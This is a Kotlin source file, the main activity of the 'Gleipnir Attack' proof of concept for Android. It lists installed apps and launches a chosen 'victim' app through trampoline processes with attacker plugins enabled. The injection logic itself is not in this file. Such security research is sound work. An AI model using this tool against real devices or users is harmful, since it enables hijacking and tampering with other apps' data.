/*
 * Gleipnir Attack POC - Exploiting the Android process share feature
 * Copyright (C) <2020>  <Sascha Roth>
 *
 * This program is free software; you can redistribute it and/or modify
 * it under the terms of the GNU General Public License as published by
 * the Free Software Foundation; either version 2 of the License, or
 * (at your option) any later version.
 *
 * This program is distributed in the hope that it will be useful,
 * but WITHOUT ANY WARRANTY; without even the implied warranty of
 * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
 * GNU General Public License for more details.
 *
 * You should have received a copy of the GNU General Public License along
 * with this program; if not, write to the Free Software Foundation, Inc.,
 * 51 Franklin Street, Fifth Floor, Boston, MA 02110-1301 USA.
 */

package org.gleipnir.app

import android.app.Activity
import android.app.ActivityManager
import android.content.Context
import android.content.Intent
import android.content.pm.ApplicationInfo
import android.content.pm.PackageManager
import android.graphics.drawable.AnimationDrawable
import android.graphics.drawable.Drawable
import android.os.Bundle
import android.system.Os
import android.util.Log
import android.view.Menu
import android.view.MenuItem
import android.view.View
import android.view.ViewGroup
import android.widget.*
import org.gleipnir.app.extendableLoader.log


/**
 * This is kind of the "Main" activity of the Gleipnir App.
 *
 * We draw a list of all Apps the user can start using the Gleipnir Attack.
 * Also he can select a bunch of Plug-Ins to be enabled while the victim App gets loaded and started.
 */
class Hacktivity : Activity() {
    var listView: GridView? = null
    val items = ArrayList<AppListItem>()
    var progress: ProgressBar? = null
    lateinit var animationDrawable: AnimationDrawable

    companion object {
        /**
         * List of available trampolines.
         *
         * This defines how many Apps can run at the same time.
         */
        val trampolines = arrayListOf(
            Trampoline1::class.java,
            Trampoline2::class.java,
            Trampoline3::class.java,
            Trampoline4::class.java,
            Trampoline5::class.java,
            Trampoline6::class.java
        )

        /**
         * Latest trampoline id used for starting an App.
         */
        var current = 0

        /**
         * Fetch a new trampoline. If there is now trampoline available anymore,
         * the Trampoline1 will be destroyed and used as well as the counter will be set to 0.
         */
        fun getNewTrampoline(): Class<out Trampoline> {
            if (trampolines.size <= current) {
                log("Hacktivity [-] unable to retrieve current trammpoline <$current>... start from beginning")
                current = 0
            }
            val trampoline = trampolines[current]
            current++
            log("Hacktivity [-] selected trampoline $trampoline")
            return trampoline
        }
    }

    /**
     * Represents one App
     */
    class AppListItem { // we have to fetch them first
        var drawable: Drawable? = null
        var label: String? = null
        var name: String? = null
        var packageName: String? = null
        var appInfo: ApplicationInfo? = null
    }

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        setContentView(R.layout.grid_layout)
        progress = findViewById(R.id.grid_progress)
        progress?.let {
            it.visibility = View.VISIBLE
        }
        initListAsync()
        findViewById<RelativeLayout>(R.id.grd_parent)?.let {
            animationDrawable =
                it.getBackground() as AnimationDrawable
            animationDrawable.setEnterFadeDuration(5000)
            animationDrawable.setExitFadeDuration(2000)
        }
    }


    /**
     * Initializes the list of Apps
     */
    fun initListAsync() {
        val apps =
            packageManager.getInstalledPackages(PackageManager.GET_META_DATA)
        apps.sortBy {
            it.packageName
        }
        listView = findViewById(R.id.gridview)
        apps.sortByDescending { app ->
            packageManager.getPackageInfo(
                app.packageName,
                PackageManager.GET_META_DATA
            ).firstInstallTime
        }
        Thread {
            items.clear()
            apps.forEachIndexed { i, package_info ->
                val it=package_info.applicationInfo
                var item = AppListItem()
                item.label = it.loadLabel(packageManager).toString()
                Log.d("Hacktivity","Label ${item.label}")
                item.drawable = it.loadIcon(packageManager)
                item.name = it.name
                item.appInfo = it
                item.packageName = it.packageName
                items.add(item)
            }

            runOnUiThread {
                progress?.visibility = View.GONE
                listView?.let {
                    val adapter: ArrayAdapter<AppListItem> =
                        object : ArrayAdapter<AppListItem>(this, R.layout.app_item, items) {


                            override fun getView(
                                position: Int,
                                cv: View?,
                                parent: ViewGroup
                            ): View {
                                var convertView = cv
                                var viewHolder: ViewHolderItem?

                                if (convertView == null) {
                                    convertView = layoutInflater.inflate(
                                        R.layout.app_item, parent, false
                                    )
                                    viewHolder = ViewHolderItem()
                                    viewHolder.icon =
                                        convertView!!.findViewById(R.id.img_icon) as ImageView
                                    viewHolder.name =
                                        convertView.findViewById(R.id.txt_name) as TextView
                                    viewHolder.label =
                                        convertView.findViewById(R.id.txt_label) as TextView
                                    convertView.tag = viewHolder
                                } else {
                                    viewHolder = convertView.tag as ViewHolderItem
                                }

                                val appInfo: AppListItem? = items[position]

                                if (appInfo != null) {
                                    viewHolder.icon?.setImageDrawable(
                                        appInfo.drawable
                                    )
                                    viewHolder.label?.text = appInfo.label
                                    viewHolder.name?.text = appInfo.name
                                }
                                return convertView
                            }

                        }

                    it.adapter = adapter
                    it.setOnItemClickListener { adapterView, view, i, l ->
                        items[i].packageName?.let { package_name ->
                            packageManager.getLaunchIntentForPackage(package_name)?.let {
                                launchApplication(items[i].appInfo!!)
                            }
                        }
                    }

                }
            }
        }.start()

    }

    class ViewHolderItem {
        var icon: ImageView? = null
        var label: TextView? = null
        var name: TextView? = null
    }

    /**
     * Launch the given application using the Gleipnir attack
     *
     * @param targetApplicationInfo the Application to be started
     */
    fun launchApplication(targetApplicationInfo: ApplicationInfo) {
        val trampolineIntent = Intent(this, getNewTrampoline())
        trampolineIntent.flags = intent.flags or Intent.FLAG_ACTIVITY_NEW_TASK
        trampolineIntent.flags = intent.flags or Intent.FLAG_ACTIVITY_CLEAR_TASK
        trampolineIntent.flags =
            intent.flags or Intent.FLAG_ACTIVITY_RESET_TASK_IF_NEEDED
        val packageInfo = this.packageManager.getPackageInfo(
            targetApplicationInfo.packageName,
            PackageManager.GET_ACTIVITIES or PackageManager.GET_META_DATA or PackageManager.GET_PROVIDERS or PackageManager.GET_RECEIVERS or PackageManager.GET_SERVICES or PackageManager.GET_PERMISSIONS or PackageManager.GET_SIGNATURES
        )
        trampolineIntent.putExtra(Trampoline.TARGET_APPLICATION, packageInfo)
        trampolineIntent.putExtra(Trampoline.PLUGINS, Plugtivity.enabledPlugins)

        killTrampoline()
        startActivity(trampolineIntent)
    }

    /**
     * Kill the process of the current trampoline
     */
    fun killTrampoline() {
        val manager = getSystemService(Context.ACTIVITY_SERVICE) as ActivityManager
        manager.runningAppProcesses.forEach {
            Log.d("Hacktivity", "ProcessName <${it.processName}> with pid <${it.pid}>")
            if (it.processName.contains("trampoline${current}")) {
                Os.kill(it.pid, 9)
            }
        }
    }

    override fun onResume() {
        super.onResume()
        animationDrawable?.start()
    }

    override fun onCreateOptionsMenu(menu: Menu?): Boolean {
        val inflater = menuInflater
        inflater.inflate(R.menu.main_menu, menu) //your file name
        return super.onCreateOptionsMenu(menu)
    }

    override fun onOptionsItemSelected(item: MenuItem): Boolean {
        return when (item.getItemId()) {
            R.id.logs_menu -> {
                startActivity(Intent(this@Hacktivity, Logtivity::class.java))
                true
            }
            R.id.plugins_menu -> {
                startActivity(Intent(this@Hacktivity, Plugtivity::class.java))
                true
            }
            else -> super.onOptionsItemSelected(item)
        }
    }
}


